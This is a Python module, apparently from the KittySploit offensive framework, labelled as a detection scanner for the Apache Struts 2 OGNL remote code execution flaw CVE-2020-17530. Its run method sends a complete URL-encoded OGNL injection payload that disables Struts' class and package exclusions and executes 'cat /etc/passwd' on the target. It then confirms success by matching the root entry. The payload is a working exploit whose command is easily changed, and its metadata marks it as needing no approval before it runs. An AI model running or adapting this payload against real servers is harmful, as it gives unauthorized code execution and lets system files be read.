#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Apache Struts 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Apache Struts 2.0.0-2.5.25 - Remote Code Execution Detection',
        'description': 'Apache Struts 2.0.0 through Struts 2.5.25 is susceptible to remote code execution because forced OGNL evaluation, when evaluated on raw user input in tag attributes, may allow it.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'apache', 'rce', 'struts', 'kev', 'packetstorm', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'http://packetstormsecurity.com/files/160721/Apache-Struts-2-Forced-Multi-OGNL-Evaluation.html',
            'http://jvn.jp/en/jp/JVN43969166/index.html',
            'https://cwiki.apache.org/confluence/display/WW/S2-061',
            'https://security.netapp.com/advisory/ntap-20210115-0005/',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-17530',
        ],
        'cve': 'CVE-2020-17530',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?id=%25%7B%28%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D%29.%28%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D%29.%28%23bean%3D%23instancemanager.newInstance%28%22org.apache.commons.collections.BeanMap%22%29%29.%28%23bean.setBean%28%23stack%29%29.%28%23context%3D%23bean.get%28%22context%22%29%29.%28%23bean.setBean%28%23context%29%29.%28%23macc%3D%23bean.get%28%22memberAccess%22%29%29.%28%23bean.setBean%28%23macc%29%29.%28%23emptyset%3D%23instancemanager.newInstance%28%22java.util.HashSet%22%29%29.%28%23bean.put%28%22excludedClasses%22%2C%23emptyset%29%29.%28%23bean.put%28%22excludedPackageNames%22%2C%23emptyset%29%29.%28%23arglist%3D%23instancemanager.newInstance%28%22java.util.ArrayList%22%29%29.%28%23arglist.add%28%22cat+%2Fetc%2Fpasswd%22%29%29.%28%23execute%3D%23instancemanager.newInstance%28%22freemarker.template.utility.Execute%22%29%29.%28%23execute.exec%28%23arglist%29%29%7D', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='critical',
                reason="Apache Struts 2.0.0-2.5.25 - Remote Code Execution detected",
                path='/?id=%25%7B%28%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D%29.%28%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D%29.%28%23bean%3D%23instancemanager.newInstance%28%22org.apache.commons.collections.BeanMap%22%29%29.%28%23bean.setBean%28%23stack%29%29.%28%23context%3D%23bean.get%28%22context%22%29%29.%28%23bean.setBean%28%23context%29%29.%28%23macc%3D%23bean.get%28%22memberAccess%22%29%29.%28%23bean.setBean%28%23macc%29%29.%28%23emptyset%3D%23instancemanager.newInstance%28%22java.util.HashSet%22%29%29.%28%23bean.put%28%22excludedClasses%22%2C%23emptyset%29%29.%28%23bean.put%28%22excludedPackageNames%22%2C%23emptyset%29%29.%28%23arglist%3D%23instancemanager.newInstance%28%22java.util.ArrayList%22%29%29.%28%23arglist.add%28%22cat+%2Fetc%2Fpasswd%22%29%29.%28%23execute%3D%23instancemanager.newInstance%28%22freemarker.template.utility.Execute%22%29%29.%28%23execute.exec%28%23arglist%29%29%7D',
            )
            return True
        return False

